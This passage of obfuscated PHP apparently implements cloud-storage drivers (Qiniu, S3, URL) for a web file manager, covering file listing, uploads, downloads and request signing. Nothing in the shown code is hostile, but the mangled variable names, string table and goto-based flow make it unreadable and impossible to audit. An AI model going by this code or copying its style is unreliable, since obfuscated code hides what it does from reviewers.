$±ø¾¶ä¾[8], !0); foreach ($ì­˜œÙ[$±ø¾¶ä¾[82]] as $û€ğÕæÆ => $ÃÕØÜÙ¼) { $ì­˜œÙ[$±ø¾¶ä¾[82]][$û€ğÕæÆ] = $this->folderInfo($ÃÕØÜÙ¼, $ÑÏë‹ğË); } foreach ($ì­˜œÙ[$±ø¾¶ä¾[83]] as $û€ğÕæÆ => $ÃÕØÜÙ¼) { $ì­˜œÙ[$±ø¾¶ä¾[83]][$û€ğÕæÆ] = $this->fileInfo($ÃÕØÜÙ¼[$±ø¾¶ä¾[94]], $ÑÏë‹ğË, $ÃÕØÜÙ¼); } return $ì­˜œÙ; } public function has($ØúçöÍÊ, $¨ó¿²Òà = false, $Ë¹µË‹„ = true) { $êé¿ÑÃ— =& $_SERVER[ïëó©ÒÚ]; $ØúçöÍÊ = trim($ØúçöÍÊ, $êé¿ÑÃ—[8]); $é›ÓÉ× = empty($ØúçöÍÊ) && $ØúçöÍÊ !== $êé¿ÑÃ—[197] ? $êé¿ÑÃ—[12] : $ØúçöÍÊ . $êé¿ÑÃ—[8]; $œ˜¡ÊşÖ = $êé¿ÑÃ—[12]; $å¬ù®¢à = 500; $µæó¨ÆÃ = $êé¿ÑÃ—[8]; $ËçêĞ·ë = $ÜññÁÉ™ = 0; while (!0) { check_abort(); list($Ìñ£è½, $óù£§ØÁ) = $this->bucketManager->listFiles($this->bucket, $é›ÓÉ×, $œ˜¡ÊşÖ, $å¬ù®¢à, $µæó¨ÆÃ); if ($óù£§ØÁ) { break; } $œ˜¡ÊşÖ = array_key_exists($êé¿ÑÃ—[1399], $Ìñ£è½) ? $œ˜¡ÊşÖ = $Ìñ£è½[$êé¿ÑÃ—[1432]] : $êé¿ÑÃ—[12]; if ($¨ó¿²Òà) { if (!empty($Ìñ£è½[$êé¿ÑÃ—[1433]])) { $ËçêĞ·ë += count($Ìñ£è½[$êé¿ÑÃ—[1433]]); } if (!empty($Ìñ£è½[$êé¿ÑÃ—[1434]])) { $ÜññÁÉ™ += count($Ìñ£è½[$êé¿ÑÃ—[1434]]); } if ($œ˜¡ÊşÖ === $êé¿ÑÃ—[12]) { break; } continue; } if ($Ë¹µË‹„) { if (!empty($Ìñ£è½[$êé¿ÑÃ—[1433]])) { return !0; } } else { if (!empty($Ìñ£è½[$êé¿ÑÃ—[1434]])) { return !0; } } if ($œ˜¡ÊşÖ === $êé¿ÑÃ—[12]) { break; } } if ($¨ó¿²Òà) { return array($êé¿ÑÃ—[207] => $ËçêĞ·ë, $êé¿ÑÃ—[208] => $ÜññÁÉ™); } return !1; } public function listAll($‹•„®¹) { $…È´Â÷è =& $_SERVER[ïëó©ÒÚ]; $ÈòÂ…ÔŒ = $this->fileList($‹•„®¹, $…È´Â÷è[12], !0); $ş£‘¤† = array(); foreach ($ÈòÂ…ÔŒ[$…È´Â÷è[83]] as $áô¨Ñã¤) { $ş£‘¤†[$áô¨Ñã¤[$…È´Â÷è[94]]] = $áô¨Ñã¤[$…È´Â÷è[76]]; } foreach ($ÈòÂ…ÔŒ[$…È´Â÷è[82]] as $áô¨Ñã¤) { if (is_string($áô¨Ñã¤)) { $ş£‘¤†[$áô¨Ñã¤] = 0; } } return $this->listAllFiles($‹•„®¹, array_keys($ş£‘¤†), $ş£‘¤†); } private function fileList($­ò³É¹ú, $àÎå¶û = '', $’ÏÌŞÙ¨ = 0) { $øÓ²ÚÌç =& $_SERVER[ïëó©ÒÚ]; $­ò³É¹ú = trim($­ò³É¹ú, $øÓ²ÚÌç[8]); $ãóõİÂ³ = empty($­ò³É¹ú) && $­ò³É¹ú !== $øÓ²ÚÌç[197] ? $øÓ²ÚÌç[12] : $­ò³É¹ú . $øÓ²ÚÌç[8]; $š±´ùÅ” = $øÓ²ÚÌç[12]; $ˆ¡üÍ…‚ = 1000; $ÅÉÜìµÌ = $ûˆú¸ û = array(); while (!0) { check_abort(); list($õ·Á¼­ê, $ôŸ’¶õ˜) = $this->bucketManager->listFiles($this->bucket, $ãóõİÂ³, $š±´ùÅ”, $ˆ¡üÍ…‚, $àÎå¶û); if ($ôŸ’¶õ˜) { break; } $š±´ùÅ” = array_key_exists($øÓ²ÚÌç[1399], $õ·Á¼­ê) ? $š±´ùÅ” = $õ·Á¼­ê[$øÓ²ÚÌç[1432]] : $øÓ²ÚÌç[12]; $˜ªˆ”Ç‚ = isset($õ·Á¼­ê[$øÓ²ÚÌç[1433]]) ? $õ·Á¼­ê[$øÓ²ÚÌç[1433]] : array(); $óÅ“†ñå = isset($õ·Á¼­ê[$øÓ²ÚÌç[1434]]) ? $õ·Á¼­ê[$øÓ²ÚÌç[1434]] : array(); foreach ($˜ªˆ”Ç‚ as $èëĞÈ¢€) { if ($èëĞÈ¢€[$øÓ²ÚÌç[94]] == $ãóõİÂ³) { continue; } $üÆŸ¨ñÇ = $èëĞÈ¢€[$øÓ²ÚÌç[94]]; $¨‚µ½ = $èëĞÈ¢€[$øÓ²ÚÌç[1430]]; $èëĞÈ¢€[$øÓ²ÚÌç[76]] = $¨‚µ½; $æ‚ŞåñÈ = $¨‚µ½ == 0 && substr($üÆŸ¨ñÇ, strlen($üÆŸ¨ñÇ) - 1, 1) == $øÓ²ÚÌç[8] ? !0 : !1; $this->cacheMethodInfoSet($üÆŸ¨ñÇ, $æ‚ŞåñÈ, $èëĞÈ¢€); if ($æ‚ŞåñÈ) { $ÅÉÜìµÌ[] = $üÆŸ¨ñÇ; continue; } $ûˆú¸ û[] = $’ÏÌŞÙ¨ ? $èëĞÈ¢€ : $üÆŸ¨ñÇ; } foreach ($óÅ“†ñå as $üÆŸ¨ñÇ) { if ($üÆŸ¨ñÇ == $ãóõİÂ³) { continue; } $ÅÉÜìµÌ[] = $üÆŸ¨ñÇ; $this->cacheMethodInfoSet($üÆŸ¨ñÇ, !0); } if ($š±´ùÅ” === $øÓ²ÚÌç[12]) { break; } } $this->cacheMethodInfoSet($­ò³É¹ú, !0); return array($øÓ²ÚÌç[82] => $ÅÉÜìµÌ, $øÓ²ÚÌç[83] => $ûˆú¸ û); } public function canRead($´…³Ç¿’) { return $this->exist($´…³Ç¿’) ? !0 : !1; } public function canWrite($¸ıêºà) { return $this->exist($¸ıêºà) ? !0 : !1; } public function getContent($öëÛäş×) { return $this->fileSubstr($öëÛäş×, 0, -1); } public function setContent($¼ëÙ‘, $¡üì¨ŠÂ = '') { $ŠùíÛ“Ú = $this->tempFile($this->pathThis($¼ëÙ‘)); file_put_contents($ŠùíÛ“Ú, $¡üì¨ŠÂ); if ($this->upload($¼ëÙ‘, $ŠùíÛ“Ú)) { $this->tempFileRemve($ŠùíÛ“Ú); return !0; } return !1; } public function refreshUrls($ªõ·áñ) { $ÉÕè§÷ç =& $_SERVER[ïëó©ÒÚ]; $€—ñ—‰â = array(); if (is_array($ªõ·áñ)) { foreach ($ªõ·áñ as $ŸÑ¿ââû) { $€—ñ—‰â[] = $this->link($ŸÑ¿ââû); } } else { $€—ñ—‰â[] = $this->link($ªõ·áñ); } $¨±Ô›û = new Qiniu\Cdn\CdnManager($this->auth); list($Á¤ü‘«‚, $ÛÓú«¼†) = $¨±Ô›û->refreshUrls($€—ñ—‰â); if ($ÛÓú«¼†) { return !1; } return $Á¤ü‘«‚[$ÉÕè§÷ç[1186]] == $ÉÕè§÷ç[770] ? !0 : !1; } public function fileSubstr($§àÒŸÇ, $¬û™ò­, $¶œÛï·š) { $¶®Â”’ =& $_SERVER[ïëó©ÒÚ]; if (!($­è³Åğ = $this->link($§àÒŸÇ))) { return !1; } $Òêõ£Æ = !1; if ($¶œÛï·š > 0) { $İÀ‘‚áĞ = $¬û™ò­ + $¶œÛï·š - 1; $Òêõ£Æ = array($¶®Â”’[1435] . $¬û™ò­ . $¶®Â”’[386] . $İÀ‘‚áĞ); } $ÑîÃïÎş = url_request($­è³Åğ, $¶®Â”’[230], !1, $Òêõ£Æ); return $ÑîÃïÎş[$¶®Â”’[760]] ? $ÑîÃïÎş[$¶®Â”’[1196]] : !1; } public function upload($…ƒùß÷, $‡Ò…Âô¶, $¨·Üğé = false, $¯²¬Şİ = REPEAT_REPLACE) { $€äˆŠ†® = new Qiniu\Storage\UploadManager(); $¶šÍÆñÅ = $this->auth->uploadToken($this->bucket, $…ƒùß÷); $©ÙÏ»‰ª = get_file_mime(get_path_ext($‡Ò…Âô¶)); list($„ØƒíÌ¼, $Ùóç–İî) = $€äˆŠ†®->putFile($¶šÍÆñÅ, $…ƒùß÷, $‡Ò…Âô¶, null, $©ÙÏ»‰ª); return $Ùóç–İî ? !1 : $this->getPathOuter($…ƒùß÷); } public function uploadFormData($™—‘üµ, $Â¯ûşå = 3600) { return $this->uploadToken($™—‘üµ, $Â¯ûşå); } public function multiUploadFormData($¼…€ü£, $å¼®³ĞÇ = 3600) { return $this->uploadToken($¼…€ü£, $å¼®³ĞÇ); } private function uploadToken($ôß×¯ŞÑ, $Ãî‡¢»Ö = 3600) { $ØŸãÏ¿é =& $_SERVER[ïëó©ÒÚ]; $…»ß×¡¿ = $Ãî‡¢»Ö; $¤—üÖ‹¡ = array($ØŸãÏ¿é[1436] => $ØŸãÏ¿é[1437]); $âª£ûÉñ = $ôß×¯ŞÑ; $Şö”Êì = $this->auth->uploadToken($this->bucket, $âª£ûÉñ, $…»ß×¡¿, $¤—üÖ‹¡, !0); $×ÄÙÄ•İ = empty($this->region) || $this->region == $ØŸãÏ¿é[1438] ? $ØŸãÏ¿é[12] : $ØŸãÏ¿é[386] . $this->region; $‘º”í«– = http_type() . "\x3a\x2f\57\165\160\154\x6f\141\x64{$×ÄÙÄ•İ}\x2e\x71\x69\x6e\x69\165\160\x2e\x63\x6f\x6d\57"; return array($ØŸãÏ¿é[1439] => $Şö”Êì, $ØŸãÏ¿é[1440] => $‘º”í«–); } public function download($øÜº¶ÛÂ, $‡¶¯¤ƒÉ) { $·Ë”çÌ† = IO::getPathInner(IO::mkfile($‡¶¯¤ƒÉ)); if (!($ÑŒŒ¾¼ç = $this->link($øÜº¶ÛÂ))) { return !1; } $Æ½€Öëë = 0; $¼±Ş†Ò¸ = 1024 * 200; $æ¸ÜÖÆ» = fopen($·Ë”çÌ†, $_SERVER[ïëó©ÒÚ][1441]); while (!0) { $ÍÔ¦¿ŠĞ = $this->fileSubstr($øÜº¶ÛÂ, $Æ½€Öëë, $¼±Ş†Ò¸); if ($ÍÔ¦¿ŠĞ === !1) { return !1; } fwrite($æ¸ÜÖÆ», $ÍÔ¦¿ŠĞ); $Æ½€Öëë += $¼±Ş†Ò¸; if (strlen($ÍÔ¦¿ŠĞ) < $¼±Ş†Ò¸) { break; } } fclose($æ¸ÜÖÆ»); return $‡¶¯¤ƒÉ; } public function link($ÈÍô³Á¡, $ğÜ—äâ‡ = '') { if (!$this->isFile($ÈÍô³Á¡)) { return !1; } $¬³ıû = $this->getHost() . $_SERVER[ïëó©ÒÚ][8] . $this->pathEncode($ÈÍô³Á¡) . $ğÜ—äâ‡; return $this->auth->privateDownloadUrl($¬³ıû, 3600 * 12); } public function fileOut($Ç–¥†á£, $†Š¡ÛÇ¸ = false, $êÕæìİ‚ = false, $øÅÀÀëš = '') { $ı¬ì‡ú÷ =& $_SERVER[ïëó©ÒÚ]; if ($this->isFileOutServer()) { return $this->fileOutServer($Ç–¥†á£, $†Š¡ÛÇ¸, $êÕæìİ‚, $øÅÀÀëš); } if (!$êÕæìİ‚) { $êÕæìİ‚ = $this->pathThis($Ç–¥†á£); } $—…ÈÕÌò = $†Š¡ÛÇ¸ ? $ı¬ì‡ú÷[1442] . rawurlencode($êÕæìİ‚) : $ı¬ì‡ú÷[12]; $À“İÁª¢ = $this->link($Ç–¥†á£, $—…ÈÕÌò); $this->fileOutLink($À“İÁª¢); } public function fileOutServer($ Ö—ÜÌö, $Ì¬Ò¿³ç = false, $®Œ×ù² = false, $÷š™ô§¹ = '') { parent::fileOut($ Ö—ÜÌö, $Ì¬Ò¿³ç, $®Œ×ù², $÷š™ô§¹); } public function fileOutImage($«éü·²ñ, $Ú€¤Ä¥ = 250) { $Ø²íªò£ = $this->link($«éü·²ñ, $_SERVER[ïëó©ÒÚ][1443] . $Ú€¤Ä¥); $this->fileOutLink($Ø²íªò£); } public function fileOutImageServer($ıƒÆîË¾, $›¬ËÎéÊ = 250) { parent::fileOutImage($ıƒÆîË¾, $›¬ËÎéÊ); } public function hashMd5($ƒ‚ÈˆØî) { $³§Ô£ïÎ =& $_SERVER[ïëó©ÒÚ]; $ıÀŞ½“ı = $this->objectMeta($ƒ‚ÈˆØî); return isset($ıÀŞ½“ı[$³§Ô£ïÎ[212]]) ? $ıÀŞ½“ı[$³§Ô£ïÎ[212]] : !1; $ÑâÃá±± = $this->link($ƒ‚ÈˆØî, $³§Ô£ïÎ[1444]); } public function size($ÀÛ†ˆÚÓ) { $â“ÉÈÍ = $this->objectMeta($ÀÛ†ˆÚÓ); return $â“ÉÈÍ ? $â“ÉÈÍ[$_SERVER[ïëó©ÒÚ][76]] : 0; } public function info($¯ó”Çê) { if ($this->isFolder($¯ó”Çê)) { return $this->folderInfo($¯ó”Çê); } else { if ($this->isFile($¯ó”Çê)) { return $this->fileInfo($¯ó”Çê); } } return !1; } public function exist($©ÚÉª¢) { return $this->isFile($©ÚÉª¢) || $this->isFolder($©ÚÉª¢); } public function isFile($œî‘ø½¦) { return !$this->isFolder($œî‘ø½¦) && $this->objectMeta($œî‘ø½¦); } public function isFolder($†”Åñ) { return $this->cacheMethod($_SERVER[ïëó©ÒÚ][165], $†”Åñ); } protected function objectMeta($úæ £ÆÜ) { return $this->cacheMethod($_SERVER[ïëó©ÒÚ][167], $úæ £ÆÜ); } protected function _objectMeta($º¿À· ) { $—«¶ÙÈ¢ =& $_SERVER[ïëó©ÒÚ]; list($¦¸”Ìßœ, $‹æŠÑ™Š) = $this->bucketManager->stat($this->bucket, $º¿À· ); if ($¦¸”Ìßœ) { $¦¸”Ìßœ[$—«¶ÙÈ¢[76]] = intval($¦¸”Ìßœ[$—«¶ÙÈ¢[1430]]); } return $¦¸”Ìßœ; } protected function _isFolder($¿õŒûªù) { $§ƒöÈ±Í =& $_SERVER[ïëó©ÒÚ]; if ($¿õŒûªù == $§ƒöÈ±Í[12] || $¿õŒûªù == $§ƒöÈ±Í[8]) { return !0; } list($Á¬¯ÙÌÆ, $ö÷Í·ó») = $this->bucketManager->listFiles($this->bucket, trim($¿õŒûªù, $§ƒöÈ±Í[8]) . $§ƒöÈ±Í[8], $§ƒöÈ±Í[12], 1, $§ƒöÈ±Í[8]); return !empty($Á¬¯ÙÌÆ[$§ƒöÈ±Í[1433]]) || !empty($Á¬¯ÙÌÆ[$§ƒöÈ±Í[1434]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($¦ÆÆÜø) { parent::__construct($¦ÆÆÜø); } public function uploadFormData($Ú‘¿‹”‹, $·À‡¹Îü = 3600) { $ÒÈ©ÙÆ =& $_SERVER[ïëó©ÒÚ]; $ì¥„ÙÒÁ = $ÒÈ©ÙÆ[198]; $’Ç—ÍÑñ = $ÒÈ©ÙÆ[1349]; $‹óŠ¢Í… = $ÒÈ©ÙÆ[62]; $Ë¡î¾–Ë = gmdate($ÒÈ©ÙÆ[1350]); $Âïõ¶ùã = gmdate($ÒÈ©ÙÆ[761]); $½û¢„ñ‰ = $ÒÈ©ÙÆ[1351]; $öíÚ‹Ë = $·À‡¹Îü . $ÒÈ©ÙÆ[12]; $ãê¿¥ = $ÒÈ©ÙÆ[1313]; $ğ¹øàúö = array($this->accessKey, $Âïõ¶ùã, $this->region, $‹óŠ¢Í…, $½û¢„ñ‰); $­öôê©‹ = implode($ÒÈ©ÙÆ[8], $ğ¹øàúö); $œëúêñŞ = array($ÒÈ©ÙÆ[1315] => gmdate($ÒÈ©ÙÆ[1314], strtotime($ÒÈ©ÙÆ[1352])), $ÒÈ©ÙÆ[1316] => array(array($ÒÈ©ÙÆ[1318] => $this->bucket), array($ÒÈ©ÙÆ[1317] => $ì¥„ÙÒÁ), array($ÒÈ©ÙÆ[1319], $ÒÈ©ÙÆ[1320], $ÒÈ©ÙÆ[12]), array($ÒÈ©ÙÆ[1319], $ÒÈ©ÙÆ[1353], $ÒÈ©ÙÆ[12]), array($ÒÈ©ÙÆ[1319], $ÒÈ©ÙÆ[1354], $ÒÈ©ÙÆ[12]), array($ÒÈ©ÙÆ[1321] => $ãê¿¥), array($ÒÈ©ÙÆ[1355] => $­öôê©‹), array($ÒÈ©ÙÆ[1356] => $’Ç—ÍÑñ), array($ÒÈ©ÙÆ[1357] => $Ë¡î¾–Ë), array($ÒÈ©ÙÆ[1358] => $öíÚ‹Ë))); $ƒõ•Ú‡ª = base64_encode(json_encode($œëúêñŞ)); $ĞÄÁ¦„Ş = hash_hmac($ÒÈ©ÙÆ[1359], $Âïõ¶ùã, $ÒÈ©ÙÆ[1360] . $this->secret, !0); $”İ“ÖØ¯ = hash_hmac($ÒÈ©ÙÆ[1359], $this->region, $ĞÄÁ¦„Ş, !0); $•ùù–Øà = hash_hmac($ÒÈ©ÙÆ[1359], $‹óŠ¢Í…, $”İ“ÖØ¯, !0); $Æ¡ã£Œ = hash_hmac($ÒÈ©ÙÆ[1359], $½û¢„ñ‰, $•ùù–Øà, !0); $±¿ºëı = hash_hmac($ÒÈ©ÙÆ[1359], $ƒõ•Ú‡ª, $Æ¡ã£Œ); $´¹ÔÛ¬Ï = array($ÒÈ©ÙÆ[215] => $ÒÈ©ÙÆ[12], $ÒÈ©ÙÆ[1361] => $ÒÈ©ÙÆ[12], $ÒÈ©ÙÆ[1317] => $ì¥„ÙÒÁ, $ÒÈ©ÙÆ[1321] => $ãê¿¥, $ÒÈ©ÙÆ[1325] => $ƒõ•Ú‡ª, $ÒÈ©ÙÆ[1362] => $­öôê©‹, $ÒÈ©ÙÆ[1363] => $’Ç—ÍÑñ, $ÒÈ©ÙÆ[1364] => $Ë¡î¾–Ë, $ÒÈ©ÙÆ[1365] => $öíÚ‹Ë, $ÒÈ©ÙÆ[1366] => $±¿ºëı, $ÒÈ©ÙÆ[181] => $this->getHost()); return $´¹ÔÛ¬Ï; } public function multiUploadFormData($¨ÔéÔöÒ, $í™èñÆ’ = 3600) { $•“İ¯Î½ =& $_SERVER[ïëó©ÒÚ]; $‡ÎâØãò = gmdate($•“İ¯Î½[1445]); $äªÇáÍì = array(); $®ôŒ„¦ã = $this->client->getUploadId($this->bucket, $¨ÔéÔöÒ, $äªÇáÍì); if (!$®ôŒ„¦ã) { return !1; } return array($•“İ¯Î½[223] => $®ôŒ„¦ã, $•“İ¯Î½[181] => $this->getHost() . $•“İ¯Î½[8] . $this->pathEncode($¨ÔéÔöÒ), $•“İ¯Î½[224] => $‡ÎâØãò, $•“İ¯Î½[94] => $¨ÔéÔöÒ); } public function multiUploadAuthData($–§îºĞâ, $€à·ÌÓ® = array()) { $õÀÔà±¦ =& $_SERVER[ïëó©ÒÚ]; $«şâ‘æ÷ = isset($€à·ÌÓ®[$õÀÔà±¦[174]]) ? $€à·ÌÓ®[$õÀÔà±¦[174]] : $õÀÔà±¦[12]; $Ï­¼½İ¿ = $€à·ÌÓ®[$õÀÔà±¦[94]]; unset($€à·ÌÓ®[$õÀÔà±¦[94]]); if (isset($€à·ÌÓ®[$õÀÔà±¦[225]])) { return $this->listUploadParts($Ï­¼½İ¿, $€à·ÌÓ®); } $†æ¸£àœ = array(); if (isset($€à·ÌÓ®[$õÀÔà±¦[1446]])) { $†æ¸£àœ[$õÀÔà±¦[1447]] = $€à·ÌÓ®[$õÀÔà±¦[1446]]; } $“”†µ‰è = explode($õÀÔà±¦[183], $this->getHost()); $…³¥ğÀ‘ = array($õÀÔà±¦[1448] => $“”†µ‰è[1], $õÀÔà±¦[1449] => $õÀÔà±¦[12], $õÀÔà±¦[215] => $õÀÔà±¦[120], $õÀÔà±¦[1361] => $€à·ÌÓ®[$õÀÔà±¦[76]]); $‡ËÄÇÁ‰ = $õÀÔà±¦[228]; $à¾úÛ‘ = $õÀÔà±¦[8] . $this->pathEncode($Ï­¼½İ¿) . $«şâ‘æ÷; $È¯‡áøƒ = $this->client->__getSignatureV4($†æ¸£àœ, $…³¥ğÀ‘, $‡ËÄÇÁ‰, $à¾úÛ‘); if (strpos($«şâ‘æ÷, $õÀÔà±¦[227]) === 0) { if (isset($†æ¸£àœ[$õÀÔà±¦[1447]])) { $‰ŞÎæ”ñ = $†æ¸£àœ[$õÀÔà±¦[1447]]; } else { if (isset($È¯‡áøƒ[$õÀÔà±¦[1447]])) { $‰ŞÎæ”ñ = $È¯‡áøƒ[$õÀÔà±¦[1447]]; } else { $‰ŞÎæ”ñ = hash($õÀÔà±¦[1359], $õÀÔà±¦[12]); } } return array($õÀÔà±¦[234] => $È¯‡áøƒ[$õÀÔà±¦[234]], $õÀÔà±¦[1447] => $‰ŞÎæ”ñ, $õÀÔà±¦[224] => $È¯‡áøƒ[$õÀÔà±¦[1450]]); } return $È¯‡áøƒ[$õÀÔà±¦[234]]; } public function listUploadParts($´æÑ‚…Œ, $²‚­Õ± = array()) { $ùæÒ²Â² =& $_SERVER[ïëó©ÒÚ]; $ùŸ©Ñ’½ = str_replace($ùæÒ²Â²[235], $ùæÒ²Â²[12], $²‚­Õ±[$ùæÒ²Â²[174]]); $øË×ÛĞ = $this->client->listParts($this->bucket, $´æÑ‚…Œ, $ùŸ©Ñ’½); if (!$øË×ÛĞ) { return !1; } $‡¯ÆÅ”Ç = $ùæÒ²Â²[1451]; foreach ($øË×ÛĞ as $õÑ¢Èëé) { $‡¯ÆÅ”Ç .= $ùæÒ²Â²[1452] . "\74\120\x61\162\x74\x4e\x75\155\x62\x65\x72\76{$õÑ¢Èëé[$ùæÒ²Â²[1406]]}\x3c\57\x50\141\x72\x74\x4e\165\x6d\142\145\162\76\12" . "\x3c\x45\124\141\147\76{$õÑ¢Èëé[$ùæÒ²Â²[1407]]}\74\x2f\x45\124\141\147\x3e\xa" . $ùæÒ²Â²[1453]; } $‡¯ÆÅ”Ç .= $ùæÒ²Â²[1454]; $òÜÊØÈï = array(); $€ªãĞ®Ô = explode($ùæÒ²Â²[183], $this->getHost()); $õ¯Í˜÷ù = array($ùæÒ²Â²[1448] => $€ªãĞ®Ô[1], $ùæÒ²Â²[215] => $ùæÒ²Â²[120], $ùæÒ²Â²[1361] => strlen($‡¯ÆÅ”Ç)); $´ÆœÅä = $ùæÒ²Â²[226]; $¯¿‹ÚÁ® = $ùæÒ²Â²[8] . $this->pathEncode($´æÑ‚…Œ) . $²‚­Õ±[$ùæÒ²Â²[174]]; $Œğ•Ì§ = $this->client->__getSignatureV4($òÜÊØÈï, $õ¯Í˜÷ù, $´ÆœÅä, $¯¿‹ÚÁ®, $‡¯ÆÅ”Ç); return array($ùæÒ²Â²[234] => $Œğ•Ì§[$ùæÒ²Â²[234]], $ùæÒ²Â²[224] => $Œğ•Ì§[$ùæÒ²Â²[1450]], $ùæÒ²Â²[236] => $øË×ÛĞ, $ùæÒ²Â²[1447] => $Œğ•Ì§[$ùæÒ²Â²[1447]]); } public function link($ğÓÕ‹²â, $º‰ êÏ¹ = array()) { return parent::link($ğÓÕ‹²â, $º‰ êÏ¹); } public function fileOut($²ŞÍÜ›°, $ú·»ˆØÒ = false, $™”Ó•¾Õ = false, $Îóï¦â„ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[ïëó©ÒÚ][1455])) { return parent::fileOutServer($²ŞÍÜ›°, $ú·»ˆØÒ, $™”Ó•¾Õ, $Îóï¦â„); } parent::fileOut($²ŞÍÜ›°, $ú·»ˆØÒ, $™”Ó•¾Õ, $Îóï¦â„); } public function fileOutImage($°ìµ£×æ, $ùü«¡Ô¯ = 250) { if (strstr($this->endpoint, $_SERVER[ïëó©ÒÚ][1455])) { return parent::fileOutImageServer($°ìµ£×æ, $ùü«¡Ô¯); } parent::fileOutImage($°ìµ£×æ, $ùü«¡Ô¯); } public function fileOutLink($Ëñ€²•) { $…Æáæó± =& $_SERVER[ïëó©ÒÚ]; if (substr($Ëñ€²•, 0, 7) == $…Æáæó±[1328]) { $Ëñ€²• = $…Æáæó±[1329] . substr($Ëñ€²•, 7); } header($…Æáæó±[161] . $Ëñ€²•); die; } public function getHost() { $‡¢úâÛ¬ =& $_SERVER[ïëó©ÒÚ]; $¾·ÉÚÎ– = str_rtrim(parent::getHost(), $‡¢úâÛ¬[8] . $this->bucket); $¾·ÉÚÎ– = explode($‡¢úâÛ¬[183], $¾·ÉÚÎ–); return $¾·ÉÚÎ–[0] . $‡¢úâÛ¬[183] . $this->bucket . $‡¢úâÛ¬[10] . $¾·ÉÚÎ–[1]; } } goto f˜ˆã³ƒ†¢; d¢È•ÈõàÒ: class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($ìö¡ø–Æ = false) { } public function exist($Ç†ËĞÜ´) { $Ê½¿€ = $this->info($Ç†ËĞÜ´); return $Ê½¿€[$_SERVER[ïëó©ÒÚ][201]]; } public function isFile($ÉÅš”ŒÌ) { $›Ô ºÄä = $this->info($ÉÅš”ŒÌ); return $›Ô ºÄä[$_SERVER[ïëó©ÒÚ][201]]; } public function isFolder($ˆÓİûø) { return !1; } public function size($”Ø˜‚…ç) { $Ó¯Ï…ì = $this->info($”Ø˜‚…ç); return $Ó¯Ï…ì[$_SERVER[ïëó©ÒÚ][76]]; } public function info($áè§‹) { return $this->infoParse($áè§‹); } public function infoAuth($ıƒĞô‘) { return $this->infoParse($ıƒĞô‘); } public function infoWithChildren($ˆ»ã—ö) { return $this->infoParse($ˆ»ã—ö); } public function infoFull($Ãäœßµ¬) { return $this->infoParse($Ãäœßµ¬); } private function infoParse($Ö«Ù½¾ï) { $Ş‰é¨Ê— =& $_SERVER[ïëó©ÒÚ]; $Çˆ§ö“ª = $this->header($Ö«Ù½¾ï); if (!$Çˆ§ö“ª || !$Çˆ§ö“ª[$Ş‰é¨Ê—[760]]) { return !1; } $µ‡Àñßí = _get($Çˆ§ö“ª, $Ş‰é¨Ê—[337], 0); $“†‹¥ìİ = array($Ş‰é¨Ê—[32] => $Çˆ§ö“ª[$Ş‰é¨Ê—[32]], $Ş‰é¨Ê—[84] => $Ö«Ù½¾ï, $Ş‰é¨Ê—[33] => $Ş‰é¨Ê—[199], $Ş‰é¨Ê—[76] => intval($µ‡Àñßí), $Ş‰é¨Ê—[174] => get_path_ext($Çˆ§ö“ª[$Ş‰é¨Ê—[32]]), $Ş‰é¨Ê—[1381] => $µ‡Àñßí > 0 && $Çˆ§ö“ª[$Ş‰é¨Ê—[1503]], $Ş‰é¨Ê—[1382] => !1); return $“†‹¥ìİ; } private function header($ĞúŞà£Á) { $ûŠ¬­»“ =& $_SERVER[ïëó©ÒÚ]; if (isset(self::$_cacheHeader[$ĞúŞà£Á])) { return self::$_cacheHeader[$ĞúŞà£Á]; } $ÕÙêÓ‰ = isset($GLOBALS[$ûŠ¬­»“[1504]]) ? $GLOBALS[$ûŠ¬­»“[1504]] : !1; $GLOBALS[$ûŠ¬­»“[1504]] = !0; self::$_cacheHeader[$ĞúŞà£Á] = url_header($ĞúŞà£Á); $GLOBALS[$ûŠ¬­»“[1504]] = $ÕÙêÓ‰; return self::$_cacheHeader[$ĞúŞà£Á]; } public function hashSimple($ŒŞ¥ˆ“Ğ, $ñË”ğò‰ = false) { $­íéÓåÇ =& $_SERVER[ïëó©ÒÚ]; $¼ˆîùÌŞ = $this->info($ŒŞ¥ˆ“Ğ); if (!$¼ˆîùÌŞ || !$¼ˆîùÌŞ[$­íéÓåÇ[201]]) { return !1; } $˜Å©ÅĞ­ = $¼ˆîùÌŞ[$­íéÓåÇ[76]]; $µû–ïÃ = 200; $‡¼€õüŒ = 50; if ($˜Å©ÅĞ­ <= $µû–ïÃ * $‡¼€õüŒ) { return md5($this->fileSubstr($ŒŞ¥ˆ“Ğ, 0, $˜Å©ÅĞ­)) . $˜Å©ÅĞ­; } $†Ò€Œ÷ = intval($˜Å©ÅĞ­ / $‡¼€õüŒ); $ò±»–ÕÃ = $­íéÓåÇ[12]; $éñïùô = timeFloat(); $Êçáâ¶ = 15; for ($Àú„ê« = 0; $Àú„ê« < $‡¼€õüŒ; $Àú„ê«++) { if (timeFloat() - $éñïùô > $Êçáâ¶) { return !1; } $¹¼’¢Ì = $this->fileSubstr($ŒŞ¥ˆ“Ğ, $†Ò€Œ÷ * $Àú„ê«, $µû–ïÃ); if (!$¹¼’¢Ì) { return !1; } $ò±»–ÕÃ .= $¹¼’¢Ì; } $ò±»–ÕÃ .= $this->fileSubstr($ŒŞ¥ˆ“Ğ, $˜Å©ÅĞ­ - $µû–ïÃ, $µû–ïÃ); return md5($ò±»–ÕÃ) . $˜Å©ÅĞ­; } public function getContent($‹¯ıËÉš) { return $this->fileSubstr($‹¯ıËÉš); } public function fileSubstr($ä©’¨®î, $‰“¸Èö« = 0, $‰ÒÏÚ¬ã = -1) { $Œñß¾ =& $_SERVER[ïëó©ÒÚ]; $’¤ßÂùî = $this->info($ä©’¨®î); if (!$’¤ßÂùî || !$’¤ßÂùî[$Œñß¾[201]] && $’¤ßÂùî[$Œñß¾[76]] > 1024 * 1024 * 10) { return !1; } if ($‰ÒÏÚ¬ã === -1) { $‰ÒÏÚ¬ã = $’¤ßÂùî[$Œñß¾[76]]; } if ($‰ÒÏÚ¬ã == 0) { return $Œñß¾[12]; } $Çí§Ê‘» = array($Œñß¾[1505] . $‰“¸Èö« . $Œñß¾[792] . ($‰“¸Èö« + $‰ÒÏÚ¬ã - 1)); $çÙ…ĞŸÄ = url_request($ä©’¨®î, $Œñß¾[230], !1, $Çí§Ê‘», !1, !1, 1); return $çÙ…ĞŸÄ[$Œñß¾[1196]] ? 